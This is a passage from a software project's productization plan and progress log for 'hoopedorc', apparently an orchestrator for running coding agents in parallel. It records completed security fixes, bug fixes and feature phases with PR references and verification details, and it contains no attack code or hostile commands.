# Productization Plan + Bug/Security Fix List

**Audience: the implementing model (Sonnet).** This doc was produced by a full read of
the codebase (all of `packages/*` and `apps/web`) plus the existing docs (PRD,
ARCHITECTURE, NEXT_STEPS, CONTRACT). It has four parts:

- **Part 1 — Fix first**: real bugs and security issues found in the current code,
  ordered by severity, each with a concrete fix. Do these before any Part 2 feature.
- **Part 2 — Productization features**: what to build to turn this into a polished,
  robust product for developers who hold multiple model subscriptions and want to run
  coding agents in parallel (autonomous runs, remote updates, mid-run intervention).
- **Part 3 — Review-pass fixes & next features** (added 2026-07-05 after Parts 1–2
  completed, from an independent audit of the merged code by a second model): five
  fixes for defects the audit confirmed in the shipped Phase 6 work, then a second
  feature wave. Same rules, same workflow. Fable will re-verify each item after it
  merges, so keep verification evidence in the PR descriptions.
- **Part 4 — Post-plan audit & UX wave** (added 2026-07-06 after Part 3 completed):
  the audit record for the merged Phase 7/8 work (three integration fixes, already
  landed as PR #57), then a UX improvement wave (U1–U10) produced by walking every
  page of the real app in a browser. This is the active work.

**Ground rules for every change:**
- `main` is sacred: branch → PR → merge. Keep `npm run typecheck`, `npm run build`,
  and `npm test -w @orc/engine` green on every PR.
- The contract is `@orc/types`. If you add/change a route or type, update
  `packages/types/src/api.ts` (+ `ROUTES`), `docs/CONTRACT.md`, and the mock server.
- Work top of this list downward. Each item states files and acceptance criteria —
  verify the criteria before moving on.

---

## Progress

Tracks completion against the **Suggested execution order** table at the bottom of
this doc. Update this section (and re-check the acceptance criteria) as each phase
lands — this is the single place to see what's done vs. still open.

### Phase 1 — S1, S2, S3, S4 (injection/exposure holes) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| S1 — Command injection via `execSync` | ✅ done | [#3](https://github.com/IngeniousArtist/hoopedorc/pull/3) |
| S2 — Unauthenticated API, open CORS | ✅ done | [#4](https://github.com/IngeniousArtist/hoopedorc/pull/4) |
| S3 — Telegram bot token in plaintext | ✅ done | [#5](https://github.com/IngeniousArtist/hoopedorc/pull/5) |
| S4 — `rm -rf` on arbitrary path | ✅ done | [#6](https://github.com/IngeniousArtist/hoopedorc/pull/6) |

All four merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` green as of each merge. Notable follow-on additions made
while implementing this phase (not separate plan items, but relevant to later work):
- `Settings.apiToken` + a shared `SECRET_SENTINEL` (`@orc/types`) — the mechanism S3
  needed for Telegram-token redaction, generalized so S2's new `apiToken` secret uses
  it too. Reuse this sentinel for any future secret field.
- The web client (`apps/web/src/api/client.ts`) now stores a bearer token in
  `localStorage` and prompts once on a 401; this is a stopgap, not the polished
  onboarding UI — F1 should replace the `window.prompt()` with a real login step.

### Phase 2 — B1, B2, B3, B4, B5 (control-plane bugs) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B1 — Stop didn't stop the running agent | ✅ done | [#8](https://github.com/IngeniousArtist/hoopedorc/pull/8) |
| B2 — Log history dead after reload (`runId: ""`) | ✅ done | [#9](https://github.com/IngeniousArtist/hoopedorc/pull/9) |
| B3 — Manual dispatch vs. autonomous loop double-run | ✅ done | [#10](https://github.com/IngeniousArtist/hoopedorc/pull/10) |
| B4 — Run rows only written at run end | ✅ done | [#11](https://github.com/IngeniousArtist/hoopedorc/pull/11) |
| B5 — Unvalidated `PATCH /api/tasks/:id` status | ✅ done | [#12](https://github.com/IngeniousArtist/hoopedorc/pull/12) |

All five merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` green as of each merge (new engine unit tests added for
B1's stop mechanism and B4's live run row). B1, B3, and B4 were also verified live
against the real (non-mock) server — B4's live-run-row fix was confirmed with real
paid model calls (`GET /api/tasks/:id/runs` showing a genuine in-flight `"running"`
row with correct non-zero durations once terminal). Notable follow-on additions:
- `TASK_STATUSES` (`@orc/types/domain.ts`) is now the single source of truth for
  the `TaskStatus` union — reused by both the server's PATCH validation (B5) and
  the Board's column list, so they can't drift apart.
- `EngineRunner.manualRuns` (added for B3) also closed a gap B1 had flagged: `stopTask`
  can now reach a manually-dispatched task's own one-off orchestrator, not just the
  autonomous-loop one.
- The Board has no "Stop" button yet — B1 is backend-only (verified via the API);
  F3 (Part 2) is where the UI button gets wired up.

### Phase 3 — S5, B6–B15 (hygiene + rails) — ✅ DONE

Split into two batches (quick independent fixes first, then the meatier ones):

| Item | Status | PR |
|---|---|---|
| B6 — `in_review` status never set | ✅ done | [#14](https://github.com/IngeniousArtist/hoopedorc/pull/14) |
| B8 — Telegram Markdown metachar failures | ✅ done | [#15](https://github.com/IngeniousArtist/hoopedorc/pull/15) |
| B12 — Risky-file regex false positives | ✅ done | [#16](https://github.com/IngeniousArtist/hoopedorc/pull/16) |
| B13 — `scopesOverlap` mishandles globs | ✅ done | [#17](https://github.com/IngeniousArtist/hoopedorc/pull/17) |
| B14 — Unbounded `logs` table growth | ✅ done | [#18](https://github.com/IngeniousArtist/hoopedorc/pull/18) |
| B11 — Gates pass vacuously, no scripts | ✅ done | [#20](https://github.com/IngeniousArtist/hoopedorc/pull/20) |
| S5 — Sanitized env for spawned agents | ✅ done | [#21](https://github.com/IngeniousArtist/hoopedorc/pull/21) |
| B7 — Planner argv E2BIG risk | ✅ done | [#22](https://github.com/IngeniousArtist/hoopedorc/pull/22) |
| B9 — Mid-run task additions invisible | ✅ done | [#23](https://github.com/IngeniousArtist/hoopedorc/pull/23) |
| B10 — Zombie approvals after restart | ✅ done | [#24](https://github.com/IngeniousArtist/hoopedorc/pull/24) |
| B15 — WS broadcasts cross-project | ✅ done | [#25](https://github.com/IngeniousArtist/hoopedorc/pull/25) |

Batch 1 (B6, B8, B12, B13, B14) merged first; `npm run typecheck`,
`npm run build`, and `npm test -w @orc/engine` green as of each merge (10/10
tests, 4 new). B6, B12, and B13 verified with new unit tests; B6 additionally
live-verified with real model calls (`in_progress → in_review → in_progress`
on a gate-failure retry, observed via `GET /api/tasks/:id` on a throwaway
repo); B8 verified with a scripted `fetch` double (no Telegram bot available);
B14 live-verified against the real server (seeded an old/oversized DB, booted,
confirmed the exact row counts pruned). Notable finds:
- B13 surfaced a **second, previously-latent bug** while fixing the first:
  `Orchestrator.start()`'s dispatch loop computed `activeScopePaths` once per
  while-iteration and never updated it as tasks were dispatched within the
  same pass — masked until B13's `scopesOverlap` fix made it observable via a
  failing integration test. Both are fixed in PR #17.
- `isAuthOrSecretFile` and `scopesOverlap`/`staticScopePrefix` (B12, B13) are
  now exported from `orchestrator.ts` specifically so they're directly unit
  testable — a pattern worth continuing for future pure-logic fixes in this
  file.

Batch 2 (B11, S5, B7, B9, B10, B15) all merged to `main`; `npm run typecheck`,
`npm run build`, `npm test -w @orc/engine` (13/13, 3 new), and
`npm test -w @orc/adapters` (2/2, new — the package had no test script before
S5) green as of each merge. B11 and B9 verified with new unit tests; S5
verified with new unit tests plus reasoning about real CLI/gate-script
behavior; B7's stdin-vs-argv switch was live-verified directly against the
installed `claude`/`opencode` CLIs (piped stdin genuinely used as the prompt,
not ignored) rather than through the full seed-e2e harness; B10 and B15 were
both live-verified against the real (non-mock) server — B10 by seeding a
zombie approval and confirming the boot-time expiry + 410 response; B15 by
subscribing three raw WS clients to different projects and confirming a
`task.updated` broadcast only reached the one subscribed to the matching
project. Notable finds/decisions:
- B11 fixed the root cause too, not just the symptom: appended a standing
  instruction to the planner's deconstruct prompt so a brand-new project's
  first scaffold task sets up real `test`/`build`/`lint`/`typecheck` scripts,
  instead of only detecting the vacuous-gate state after the fact.
- B9's fix replaced the older single-task `SchedulerDeps.getTask` refresh
  hook entirely with a broader `getTasks` reconciliation run at the top of
  every loop pass — one mechanism now covers both "new task appeared" and
  "a known task's fields changed," including `status` (which the old hook
  never adopted).
- B15 required adding `projectId` to `Run`/`LogEvent`/`MergeDecision` (a
  schema migration via the existing `ALTER TABLE` list in `db/index.ts`) since
  those three `ServerEvent` payloads were the only ones that didn't already
  carry one.
- Did not add a Board warning banner for B11's vacuous-gate case — the web
  app has no plumbing yet to surface `GateResult`/`MergeDecision` per task at
  all; that's squarely F2's "Review tab" scope.

### Phase 4 — F1, F2, F3, F4 (core product loop) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F1 — First-run onboarding wizard | ✅ done | [#27](https://github.com/IngeniousArtist/hoopedorc/pull/27) |
| F2 — Task detail drawer | ✅ done | [#28](https://github.com/IngeniousArtist/hoopedorc/pull/28) |
| F3 — Mid-run control | ✅ done | [#29](https://github.com/IngeniousArtist/hoopedorc/pull/29) |
| F4 — Live mission control strip | ✅ done | [#30](https://github.com/IngeniousArtist/hoopedorc/pull/30) |

All four merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` (14/14, 1 new) green as of each merge. Every item was
live-verified in a real browser against a real (non-mock) server seeded
directly via SQLite for the specific scenario each feature needed (empty DB
for F1's onboarding gate; a task with real runs + merge decisions for F2's
tabs; a running project + an in-flight task for F3's stop/add-task/pause
controls; active tasks + budget + a pending approval for F4's strip) — not
just typechecked. Notable finds/decisions:
- F1: extracted `RoutingEditor` out of `Settings.tsx` into a shared component
  (now used by both Settings and the wizard) instead of duplicating ~110
  lines; added a new `GET /api/setup/models` endpoint (shells `opencode
  models`) so the model-mapping step offers a real datalist instead of a
  blind text field.
- F2: `LogPanel.tsx` was repurposed into just the log list (no outer
  fixed-shell/close-button) since `TaskDrawer` now owns that shell across all
  four tabs. New `GET /api/tasks/:id/decisions` route — the repo function
  (`getMergeDecisions`) already existed, just wasn't wired to a route.
- F3: "Reprioritize via drag" needed zero new code — the Board's existing
  generic drag-and-drop plus B5's PATCH validation already implemented it.
  New `Orchestrator.pause(project, { drain? })`: drain mode forces the
  dispatch loop's `ready` list empty instead of aborting, letting active
  tasks finish naturally; `EngineRunner.pause` only removes the orchestrator
  from its map for the non-drain case, so a second Start can't race in while
  a drain is still finishing. Live testing caught and fixed a real bug: the
  Stop confirm/toast text said "requeued to backlog" but the actual behavior
  is "moved to Blocked".
- F4: reused `TaskCard`'s `Heartbeat`/`agoLabel` (now exported) instead of
  duplicating elapsed-time formatting; `Board.tsx`'s existing `costAnalytics`
  fetch already returned `budgetUsd`, just wasn't being read — no new
  request needed for the budget bar.

### Phase 5 — F5, F6, F7, F8 (away-from-keyboard autonomy) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F5 — Notifications that reach the user | ✅ done | [#32](https://github.com/IngeniousArtist/hoopedorc/pull/32) |
| F6 — Model health + subscription awareness | ✅ done | [#33](https://github.com/IngeniousArtist/hoopedorc/pull/33) |
| F7 — Cost guardrails short of the hard stop | ✅ done | [#34](https://github.com/IngeniousArtist/hoopedorc/pull/34) |
| F8 — Autonomous-run report card | ✅ done | [#35](https://github.com/IngeniousArtist/hoopedorc/pull/35) |

All four merged to `main`; `npm run typecheck`, `npm run build`,
`npm test -w @orc/engine` (15/15, 1 new), and `npm test -w @orc/adapters`
(4/4, 2 new) green as of each merge. UI-touching pieces were live-verified in
a real browser against a real (non-mock) server seeded directly via SQLite;
server-only logic (cooldown skip, budget-threshold gating, run-summary
computation) was verified with standalone scripts that boot a real
`EngineRunner`/`Orchestrator` against a real in-memory SQLite DB and reach
private methods via `as any` — exercising actual production code paths, not
reimplementations. Notable finds/decisions:
- F5: `Settings.telegram.digest` (`"off" | "terminal" | "all"`) gates task
  status pushes independent of the always-unconditional audit entry and
  always-sent approval requests. New `ApprovalContext` (PR url + top
  validator reasons) enriches the Telegram approval message. New
  `useBrowserNotify` context wraps the Notifications API — only fires while
  the tab is hidden, so it doesn't nag an already-focused window.
- F6: adapters classify a failed run's `exitReason` as `"rate_limited"` (new
  `classifyFailure`, regex against the failure summary) instead of the
  generic `"error"`; `EngineRunner` tracks a cross-project in-memory
  cooldown map keyed by model, consulted via a new
  `SchedulerDeps.checkModelCooldown` hook at dispatch time — mirrors
  `checkBudget` exactly (skip, don't fail, warn once). New `model_checks`
  table persists "Test models" results so the new SetupView health panel's
  "last check" column survives a reload; failure rate + median duration come
  from the existing `runs` table (median computed in JS — SQLite has no
  `MEDIAN` aggregate).
- F7: new `budget_alerts` table (unique on `scope, threshold`) makes the
  50%/80% warnings fire exactly once each; the global scope's key bakes in
  the calendar month (`global:2026-07`) so a new month re-arms both
  thresholds without any explicit reset, matching how the global budget
  itself is month-scoped. Raising a project's budget cap also clears its
  recorded alerts, so crossing 80% once doesn't permanently silence future
  warnings. The per-task estimate chip reused the `estimate.ts`/
  `GET /api/projects/:id/estimate` machinery that already existed but was
  unused by the Board. The "budget bar turns amber/red" ask needed zero new
  code — F4's `MissionControl` already covered it.
- F8: report cards are scoped to one autonomous-loop start-to-finish cycle
  (`ts >= runStartedAt` against the audit log), not the project's lifetime
  totals — a new `repo.getCostSince` made that precise. Persisted as a
  `run_summary`-kind audit entry; `AuditView` separates those out into a
  dedicated "Run Reports" section instead of mixing them into the
  chronological list. Skipped the plan's optional "pipe through the
  updates-role model for natural language" toggle — explicitly optional, and
  the plan itself says the mechanical digest must not depend on a model.

### Phase 6 — F9, F10, F11, F12 (flexibility, packaging, docs) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F9 — Project templates & per-project gate config | ✅ done | [#37](https://github.com/IngeniousArtist/hoopedorc/pull/37) |
| F10 — Packaging & deployment | ✅ done | [#38](https://github.com/IngeniousArtist/hoopedorc/pull/38) |
| F11 — Docs for other users | ✅ done | [#39](https://github.com/IngeniousArtist/hoopedorc/pull/39) |
| F12 — Multi-project run queue | ✅ done | [#40](https://github.com/IngeniousArtist/hoopedorc/pull/40) |

All four merged to `main`; `npm run typecheck`/`npm run build` green
across every workspace as of each merge. **This closes out Phase 6 — every
item in Part 1 (security/bugs) and Part 2 (product features) of this plan
is now done.** F12: `ModelConfig.maxConcurrent` was only ever enforced
per-`Orchestrator`-instance, so two concurrently-running projects could
each dispatch `maxConcurrent` copies of the same model at once — new
optional `SchedulerDeps.getModelActive`/`incModelActive`/`decModelActive`
hooks let `EngineRunner.buildOrchestrator` wire every project's Orchestrator
to ONE shared counter instead (falls back to a local per-instance count
when the hooks are absent, e.g. unit tests). Writing the test for this
surfaced a real correctness gap the change introduced: the dispatch loop's
"nothing dispatched, nothing of mine active → wind down" exit condition
assumed a blocked task could only be freed by this orchestrator's own
activity — with a shared cap, it can now be freed by a *different*
project's task finishing, so a new `blockedByCapacity` flag makes that
specific case poll-and-retry instead of prematurely ending the run.
`ProjectsView` also gained inline Start/Pause per row (previously
read-only). Verified: `npm test -w @orc/engine` 21/21 (1 new, proving two
separate Orchestrator instances sharing an injected registry actually
serialize dispatch of a capped model); the real `EngineRunner` wiring
itself (not just Orchestrator logic) was live-verified via a standalone
script reaching `buildOrchestrator` for two different real projects and
confirming their deps share one counter; the Projects-page buttons'
underlying routes were live-verified via curl. Browser screenshot
verification was attempted for both F11 and F12's UI pieces but the Chrome
extension tool errored at the frame level across several attempts
(confirmed via curl that the dev servers themselves served fine) — noted
rather than claimed.

F11 merged to `main`; `npm run typecheck`/`npm run build` (`@orc/web`)
green. New `docs/USER_GUIDE.md` covers what it is, install/prereqs (which
subscription each specialist model needs, `opencode auth login`), a
first-project tutorial, the safety model, remote Tailscale setup, and a
troubleshooting table drawn from real failure modes hit during development
(the historic PWD/worktree bug, `opencode`'s "database is locked"
collision-retry, vacuous gates, a misconfigured self-review validator, and
F10's Keychain/Docker auth caveat). Linked from the README and the app's
Setup page. Browser live-verification was attempted but the Chrome
extension tool errored at the frame level regardless of URL (confirmed via
curl that the dev server itself served fine) — for this one, a single
external link with no new logic, typecheck+build+code review stood in for
a screenshot.

F10 merged to `main`; `npm run typecheck`/`npm run build` green,
`npm test -w @orc/engine` (20/20) / `-w @orc/adapters` (4/4) unaffected. The
server now serves the built web app itself (`@fastify/static` on
`apps/web/dist`, no-op until that directory exists so `npm run dev` is
unaffected) with a SPA-style fallback to `index.html` for unmatched non-API
paths — live-verified against the real built `dist/index.js`, not just
source. New root `npm run start`/`npm run setup` (`scripts/init.mjs`) and a
`hoopedorc` CLI (`bin/hoopedorc.mjs`); `npm run setup` was run for real
(created `.env`, all three CLI checks passed). `deploy/` holds a systemd
unit (the primary supported path) plus a reference Dockerfile/compose —
writing the Docker auth caveats surfaced a real, verified fact worth
remembering: **Claude Code's login lives in the macOS Keychain**, which a
Linux container cannot access at all (mountable or not); the documented
workaround is `ANTHROPIC_API_KEY` (confirmed via `claude --help`'s `--bare`
mode), which bills per-token via the Console rather than a Pro/Max
subscription's flat rate. The Docker path itself was **not** built/run
against a live daemon (none available in this environment) — it's a
documented starting point, not a verified recipe. New `CHANGELOG.md`
(retroactive entries per phase) + README updates.

F9 merged to `main`; `npm run typecheck`, `npm run build`, `npm test -w
@orc/engine` (20/20, 5 new), and `npm test -w @orc/adapters` (4/4) green.
New `Project.config` (`ProjectConfig`) holds per-project gate script
overrides (or `false` to skip a gate), a free-form `testCommand` for
non-npm stacks (execFile, no shell), a `maxAttempts` default for tasks
created in that project, and a `mergePolicy` override — all optional, so an
unset project behaves exactly as before. `GateRunnerImpl` reads
`project.config.gates` directly (it already receives `project` via
`.run(project, task)`, so no `SchedulerDeps.gateConfig` plumbing was needed
— a deliberate simplification vs. the plan's original wording);
`canAutoMerge` resolves `project.config?.mergePolicy` before falling back to
`Settings.mergePolicy`. New shared `ProjectConfigFields` "Advanced" accordion
used by both `NewProject` (create) and `ProjectHeader` (post-creation edit,
budget-row-style dirty-check + save). Live-verified against a real
(non-mock) server via curl + sqlite3: config round-trips on create/GET,
invalid values 400, PATCH updates/null-clears it, maxAttempts default
applies correctly with and without an override, and an old pre-F9 DB
migrates cleanly. Notable find: writing real (non-mocked) tests for the
gate overrides surfaced a genuine pre-existing bug in B11's vacuous-gate
detection — `npm run <script> --if-present` exits 0 whether or not the
script exists, so the old `ran` flag (inferred from a thrown error) was
silently always `true` on success in every real repo, only ever
"working" in mocked tests. Fixed by checking `package.json` directly
(`hasNpmScript`) instead of inferring presence from npm's exit behavior.

### Phase 7 — B16–B19, S6 (review-pass fixes) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B16 — Dockerfile build stage certainly fails (missing COPYs) | ✅ done | [#42](https://github.com/IngeniousArtist/hoopedorc/pull/42) |
| B17 — Configured-but-missing gate script silently passes | ✅ done | [#43](https://github.com/IngeniousArtist/hoopedorc/pull/43) |
| B18 — Capacity-blocked project waits silently | ✅ done | [#44](https://github.com/IngeniousArtist/hoopedorc/pull/44) |
| B19 — Manual dispatch invisible to the global model cap | ✅ done | [#45](https://github.com/IngeniousArtist/hoopedorc/pull/45) |
| S6 — Auth polish: real login screen, constant-time compare, doc note | ✅ done | [#46](https://github.com/IngeniousArtist/hoopedorc/pull/46) |

B16 fixed: `deploy/Dockerfile`'s build stage now copies `tsconfig.base.json`,
`bin/`, and `scripts/` before `npm ci` (every workspace tsconfig extends the
root base config, and the root `package.json` declares a `bin` entry +
`setup` script pointing at those paths, so both were required for `npm ci`
and `npm run build` to succeed). No Docker daemon available in this
environment — verified by replicating the exact post-fix `COPY` set
(`package*.json`, `tsconfig.base.json`, `bin/`, `scripts/`, `packages/`,
`apps/`, excluding gitignored `node_modules`/`dist` to match what a real
build context from a git checkout would contain) into a fresh temp dir and
running `npm ci && npm run build` there — both succeeded.

B17 fixed: `gate-runner.ts`'s `runGate()` and `runTestsGate()`'s `testScript`
branch now check `hasNpmScript` for an explicit override *before* delegating
to `runScript`, returning a hard `passed: false` with a
`configured gate script "<name>" not found in package.json` message when the
named script doesn't exist — mirrors `runCommand`'s existing reasoning for
`testCommand` (operator-configured means failures are real, not "nothing to
run"). The default-slot path (no override) is untouched: `runScript`'s own
internal `hasNpmScript` check still returns `{ passed: true, ran: false }`
for a repo with no default `typecheck`/`lint`/`build`/`test` scripts, which
is exactly the B11 vacuous-gate signal. Three new `gate-runner.test.ts`
cases cover all three acceptance scenarios (typecheck override missing →
fails loudly; testScript override missing → fails the tests gate loudly;
default-slot missing script with no override → still passes vacuously) —
24/24 engine tests green (3 new).

B18 fixed: `orchestrator.ts` gained a `capacityBlockedWarned` Set that
mirrors `budgetBlockedWarned`/`cooldownBlockedWarned` exactly — cleared in
`start()`, one `"warn"`-level log ("Model at capacity (in use by another
task or project), holding: `<model>`") emitted the first time the
`active >= cfg.maxConcurrent` skip fires for a task, and deleted from the
set right where the task actually dispatches (mirroring the budget/cooldown
delete-on-dispatch pattern). Previously the F12 capacity skip was the only
one of the three dispatch-blocking checks with no log line at all — with a
shared cross-project cap, a project could sit polling for minutes on
another project's model slot looking indistinguishable from a hang. New
unit test: pre-load a shared registry already at `maxConcurrent`, let the
250ms poll loop run several passes (600ms), confirm exactly one capacity
warn log fires (not one per poll), then free the slot and confirm the task
dispatches and completes. 25/25 engine tests green (1 new).

B19 fixed: `runTask()` (the `/dispatch` manual-run path) now calls
`this.incModel(task.assignedModel)` and `this.runningModel.set(task.id, ...)`
before `executeTask`, and its `finally` mirrors `start()`'s dispatch-finally
exactly — decrement whichever model the task last ran on (fallback
escalation may have switched it), then clear `runningModel`/`activeTaskIds`.
Deliberately does **not** add a capacity *check* to `runTask`: a manual
dispatch is a human's explicit action and must never be silently
capacity-blocked, but until this fix it was invisible to the shared F12
registry, so the autonomous loop (or another project) could pile
`maxConcurrent` *more* copies of the same model on top of it. Updated the
stale `manualRuns` doc-comment in `engine-runner.ts`, which previously
stated manual runs "never contribute to that count" — they now do (the
capacity check is still skipped, only the counting changed). New unit test:
a manually-dispatched task and a second `Orchestrator`'s autonomous-loop
task share a registry and both target a `maxConcurrent: 1` model — asserts
their author adapter calls never overlap (`maxConcurrentAuthors === 1`) and
both finish `done`. As documented in the plan, left the known escalation
transient-overshoot case alone (fallback escalation increments the next
model without a capacity check — blocking mid-task risks deadlock, so a
brief overshoot is the accepted tradeoff). 26/26 engine tests green (1 new).

S6 fixed (all three leftovers): **(1) Login screen.** New
`apps/web/src/components/TokenGate.tsx` — a small centered card, rendered by
`App.tsx` only when `client.ts`'s new `setUnauthorizedHandler` callback
fires (i.e. only after a real 401; auth-off, the default, never trips it).
`client.ts` replaced the old blocking browser-prompt stopgap with
`export function setUnauthorizedHandler(h)`; on 401 it awaits the handler,
stores what it resolves with, and retries once. `TokenGate` validates the
entered token itself — a raw `fetch(apiUrl("getSettings"))` with the
candidate token, bypassing `api()` to avoid recursing back into the 401
handler — so by the time it resolves the outer promise the token is already
confirmed-good, and it shows an inline "Incorrect token." error and stays
open on a bad guess instead of closing and surfacing a generic error
elsewhere. `useWS.ts` needed no changes: it already reads
`getStoredApiToken()` fresh on every reconnect attempt (verified by reading
the code, then confirming live — see below). `grep -r` for the old prompt
mechanism (matched as a literal string) now returns nothing under
`apps/web/src`. **(2) Constant-time compare.** New `safeTokenEqual()` in
`index.ts`'s auth hook uses `node:crypto`'s `timingSafeEqual` on UTF-8
buffers with a length-mismatch guard first (since `timingSafeEqual` throws
rather than returning `false` on unequal lengths); applied to both the
bearer-header and `?token=` query-param checks. **(3) Docs.** New paragraph
in `USER_GUIDE.md`'s Remote setup section: the SPA shell (`/`, JS, CSS) is
served without a token even when `API_TOKEN` is set — only `/api/*` and the
WebSocket upgrade are gated — by design (the shell has no data in it), but
worth knowing since anyone reaching the port can see Hoopedorc is running
there. Live-verified end-to-end against a real (non-mock) server with
`API_TOKEN` set, using `agent-browser` against the actual built
`apps/web/dist` (F10's static-serving path, not the Vite dev server): fresh
page load (cleared `localStorage`) showed the in-app TokenGate with no
native browser dialog; submitting a wrong token showed the inline
"Incorrect token." error and the gate stayed open (screenshotted); a
followup fresh page load after clearing `localStorage` and setting a stale
bogus token confirmed the gate is skipped entirely when the server has no
`API_TOKEN` configured, regardless of leftover `localStorage` content;
submitting the correct token closed the gate and loaded the full Board with
live mock data. Server request logs confirm the WebSocket path specifically:
an unauthenticated `GET /ws` attempt was rejected `401` before the token was
entered, then subsequent `GET /ws?token=...` upgrade attempts after
authenticating were **not** 401'd (no rejection logged for any of them),
proving the socket itself authenticated — not just the REST calls. Also
curl-verified the constant-time compare's observable behavior directly: no
token → 401, wrong token → 401, correct token → 200, `/api/health` and the
SPA shell → 200 unauthenticated in all cases. `npm run typecheck`/
`npm run build` green across all workspaces; `npm test -w @orc/engine`
(26/26) and `-w @orc/adapters` (4/4) unaffected (`@orc/server` has no test
package of its own — live verification is the bar for server-only changes
here, matching precedent from S2's original auth-hook work).

### Phase 8 — F14–F19 (user opted in to F19 too) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F14 — CI for this repo (GitHub Actions) | ✅ done | [#48](https://github.com/IngeniousArtist/hoopedorc/pull/48) |
| F15 — "Wait for GitHub checks" merge gate | ✅ done | [#51](https://github.com/IngeniousArtist/hoopedorc/pull/51) |
| F16 — Subscription quota awareness | ✅ done | [#52](https://github.com/IngeniousArtist/hoopedorc/pull/52) |
| F17 — DB backup rotation | ✅ done | [#53](https://github.com/IngeniousArtist/hoopedorc/pull/53) |
| F18 — Sandbox design doc (docs only) | ✅ done | [#54](https://github.com/IngeniousArtist/hoopedorc/pull/54) |
| F19 — Scheduled runs (previously optional — user explicitly asked for it after Phase 7, so it's in scope; do after F14-F17) | ✅ done | [#55](https://github.com/IngeniousArtist/hoopedorc/pull/55) |

F14 fixed: new `.github/workflows/ci.yml` runs on every PR and push to
`main` — checkout, `setup-node@v4` (node 22, npm cache), `npm ci`,
`npm run typecheck`, `npm run build`, `npm test -w @orc/engine`,
`npm test -w @orc/adapters`. No Docker build step, no secrets needed. The
very first CI run immediately found a real, previously-invisible bug:
`npm run typecheck` failed everywhere with "Cannot find module '@orc/types'"
because `@orc/types`/`@orc/adapters`/`@orc/engine` all resolve their
`"types"` field to `./dist/index.d.ts`, and a fresh checkout has no `dist/`
at all (gitignored) — this was masked in every local dev session so far
because `dist/` always already existed from some earlier build. Reproduced
locally by deleting every workspace's `dist/` and hitting the identical
failure. Fixed the root cause: the root `typecheck` script now builds
`@orc/types` → `@orc/adapters` → `@orc/engine` (mirroring the existing
`build` script's dependency order) before running the per-workspace `tsc`
checks — so `npm run typecheck` alone is correct on any fresh checkout, not
just under CI. Verified: reran the full sequence from a clean `dist`-less
state (typecheck → build → both test suites, all green), then confirmed the
actual GitHub Actions run on the PR went green via `gh pr checks --watch`.

F15 fixed: new opt-in per-project `ProjectConfig.requireGithubChecks` +
`githubChecksTimeoutMin` (integer 1–120, default 15). **Verified the real
`gh` CLI's behavior by hand before writing any code** (per the plan's
explicit instruction not to trust the paragraph's assumptions) using a
throwaway probe PR against this very repo — the actual semantics turned out
cleaner than assumed: with `--json bucket,state,name`, `gh pr checks`
**always exits 0** for pass/pending/fail alike (the real state lives in
each check's `bucket` field, not the exit code — confirmed `"pass"`,
`"pending"`, `"fail"` directly); the **one** case that still throws (exit 1)
even with `--json` is "no checks configured at all", which prints a literal
`no checks reported on the '<branch>' branch` message instead of any JSON.
New `GitService.waitForChecks(project, prNumber, timeoutMs, onPoll?)` in
`git-service.ts` polls every 15s on exactly that logic: parse the JSON
array, `"fail"`/`"cancel"` bucket → `"failed"`; no `"pending"` bucket left →
`"passed"`; the "no checks reported" message → `"none"`; any other
unexpected CLI error tolerated (keep polling, don't fail the task over one
bad poll) until `timeoutMs` elapses → `"timeout"`. `Orchestrator.executeTask`
consults it right before the existing `canAutoMerge` risk check (after
`syncBranchWithMain`, guarded by `project.config?.requireGithubChecks`):
`"passed"`/`"none"` fall through to the normal risk-based merge decision
unchanged; `"failed"`/`"timeout"` skip straight to the existing
`requestApproval` escalation (reusing the same `approve_merge`/`reject`
shape as the risky-change path) since there's nothing more for
`canAutoMerge` to add once GitHub's own CI has already failed or hung.
`bailIfStopRequested` is checked immediately after the wait returns, so a
Stop press during a multi-minute wait can't be overtaken by checks finishing
and auto-merging behind it. Investigated the plan's stuck-detector warning
directly in the code rather than assuming it applied: `STUCK_DETECTION`'s
actual watchdog timers (`maxRunTimer`/`idleTimer`) are scoped and cleared
entirely within `runAuthor`, so a wait during the merge phase can't trigger
an abort — but the Board's `TaskCard` heartbeat indicator (`apps/web/.../
TaskCard.tsx`) mirrors the same `idleMs` threshold purely cosmetically from
log timestamps, so a silent multi-minute wait would still make the card
misleadingly look "possibly stuck" to a human watching the Board. Emitting
an info log line on every poll (as the plan asked) keeps that heartbeat
honest regardless of which mechanism was actually at risk. New
`apps/web/src/components/ProjectConfigFields.tsx` checkbox + conditional
timeout-minutes input alongside F9's other per-project Advanced fields.
Verified: 5 new engine unit tests with a fake `GitService` covering all
four outcomes plus the Stop-during-wait case (31/31 engine tests green,
4/4 adapters); **also live-verified the real (non-fake) `GitServiceImpl.
waitForChecks` implementation** via a standalone script against real PRs in
this repo — PR #48 (real passed CI) → `"passed"`, PR #47 (merged before CI
existed, no checks) → `"none"`, and a throwaway broken PR → `"failed"` —
exercising the actual JSON-parsing/bucket-decision code, not just CLI
behavior in isolation. The `"timeout"` path is covered by the fake-GitService
unit test only (precise real-world timing control wasn't practical to
reproduce safely). `npm run typecheck`/`npm run build` green across all
workspaces.

F16 fixed: new optional `ModelConfig.quota: { windowHours, maxRuns?,
maxCostUsd? }` declares a subscription's rolling usage window (Claude Pro's
cap being the motivating case); `PUT /api/settings` rejects a quota with a
non-positive `windowHours`, neither `maxRuns` nor `maxCostUsd` set, or a
non-positive limit. New `repo.getModelUsageSince(db, model, sinceIso)`
counts `runs` rows (every attempt, not just terminal ones — a subscription
window cares about requests made) and sums `costs` rows for a model since a
timestamp, across ALL projects (mirroring `getModelMonthlyCost`'s
cross-project reasoning, just with a rolling window instead of a calendar
month). New `budget.ts` function `checkModelQuota(db, model, settings)`
computes the window's cutoff from `quota.windowHours` and returns a reason
once either limit is met. Wired into `EngineRunner.buildOrchestrator` as a
direct lambda (`checkModelQuota: (modelId) => checkModelQuota(this.db,
modelId, settings)`) — a deliberate deviation from the plan's literal
